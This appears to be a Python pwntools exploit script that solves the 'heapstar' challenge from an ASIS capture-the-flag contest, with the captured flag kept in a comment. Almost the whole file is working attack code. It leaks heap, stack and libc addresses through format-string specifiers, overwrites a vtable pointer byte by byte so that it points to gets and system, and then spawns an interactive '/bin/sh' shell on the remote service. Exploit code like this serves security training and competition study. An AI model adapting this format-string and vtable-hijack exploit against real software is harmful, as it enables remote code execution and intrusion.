#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import time
from pwn import *
#ASIS{H34P_F0RM4T_STR1NG_1S_FUnnY_Bunny}
#host = "10.211.55.28"
#port = 8888
host = "heapstar.asis-ctf.ir"
port = 1337


r = remote(host,port)

def insert(data):
    r.recvuntil(">>")
    r.sendline("i")
    r.recvuntil(":")
    r.sendline(data)

def clear():
    r.recvuntil(">>")
    r.sendline("c")

def peek(pat):
    r.recvuntil(">>")
    r.sendline("p")
    r.recvuntil("\r\n")
    data = r.recvuntil(pat)
    return data

insert("%2$p:%8$p:%21$p:%14$p:aa")
data = peek("aa").split(":")
print data
heap = int(data[0].strip(),16) - 0x10
ebp = int(data[1].strip(),16)
ebp2 = int(data[3].strip(),16)
libc = int(data[2].strip(),16) - 240 - 0x20740
print "heap:",hex(heap)
print "ebp:",hex(ebp) #8
print "ebp2:",hex(ebp2) #14
print "libc:",hex(libc)
clear()
#magic = libc + 0xef9f4
gets = libc + 0x6ecc0
system = libc + 0x45380
#clear()
vtablea = heap +0x548
for i in range(4):
    payload  = fmtchar(0,(vtablea >> i*8) & 0xff,14)
    payload += "aa"
    insert(payload)
    peek("aa")
    clear()
    payload = fmtchar(0,(ebp2+i+1) & 0xff,8)
    payload += "aa"
    insert(payload)
    peek("aa")
    clear()

payload = fmtchar(0,ebp2 & 0xff,8)
payload += "aa"
insert(payload)
peek("aa")
clear()

for i in range(8):
    payload = fmtchar(0,(gets >> i*8) & 0xff,20)
    payload += "aa"
    insert(payload)
    peek("aa")
    clear()
    payload = fmtchar(0,(vtablea + i+1) & 0xff,14)
    payload += "aa"
    insert(payload)
    peek("aa")
    clear()

for i in range(6):
    payload = fmtchar(0,(system >> i*8) & 0xff,20)
    payload += "aa"
    insert(payload)
    peek("aa")
    clear()
    payload = fmtchar(0,(vtablea + 8+i+1) & 0xff,14)
    payload += "aa"
    insert(payload)
    peek("aa")
    clear()

r.recvuntil(">>")
r.sendline("a")
time.sleep(0.2)
r.sendline("/bin/sh;")
time.sleep(0.2)
r.sendline("b")

r.interactive()
